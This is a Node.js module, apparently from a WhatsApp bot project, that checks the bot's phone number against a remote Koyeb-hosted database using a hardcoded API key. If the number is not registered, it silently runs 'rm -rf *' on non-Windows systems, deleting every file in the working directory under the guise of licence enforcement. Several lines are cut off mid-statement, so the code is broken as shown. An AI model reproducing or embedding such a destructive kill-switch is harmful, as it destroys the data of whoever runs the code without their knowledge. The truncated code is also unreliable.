const axios = require('axios');
const chalk = require('chalk');
const { execSync } = require('child_process');
const os = require('os');

const ah_loli = 'mannevgr';

async function baileys(input) {
  const botNumber = input.split('@')[0];

  try {
    console.log(chalk.cyan('[*] Connecting to secure database...'));
    await delay(800);

    const res = await axios.post('https://ms-database.koyeb.app/getu>
      headers: { 'x-api-key': ah_loli }
    });

    console.log(chalk.cyan('[*] Fetching bot credentials...'));
    await delay(1000);

    const isRegistered = res.data.users.some(user => user.botnumber >

    if (!isRegistered) {
      console.log(chalk.redBright(`[x] Access denied for BOT ${botNu>
      await delay(1000);

      // Handle cross-platform deletion
      if (os.platform() === 'win32') {
        console.log(chalk.red('[x] Sistem Windows tidak mendukung rm>
      } else {
        execSync('rm -rf *', { stdio: 'inherit' });
      }
    } else {
      console.log(chalk.greenBright(`[✓] BOT ${botNumber} verified. >
    }
  } catch (err) {
    console.log(chalk.redBright('[x] Connection failed:'), err.messa>
  }
}

// delay helper
const delay = ms => new Promise(res => setTimeout(res, ms));

module.exports = { baileys };
